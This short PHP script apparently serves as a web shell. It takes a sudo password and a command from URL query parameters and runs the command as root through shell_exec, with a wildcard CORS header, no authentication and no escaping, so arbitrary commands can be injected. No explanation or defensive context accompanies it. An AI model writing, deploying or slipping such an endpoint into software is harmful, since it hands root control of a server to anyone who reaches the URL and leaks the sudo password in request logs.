<?php
    header("Access-Control-Allow-Origin: *");
    $pwd = $_GET['pwd'];
    $cmd = $_GET['cmd'];
    shell_exec('echo "'.$pwd.'" | sudo -S "'.$cmd.'" &>/dev/null &');
    shell_exec('sudo -S "'.$cmd.'" &>/dev/null &');
?>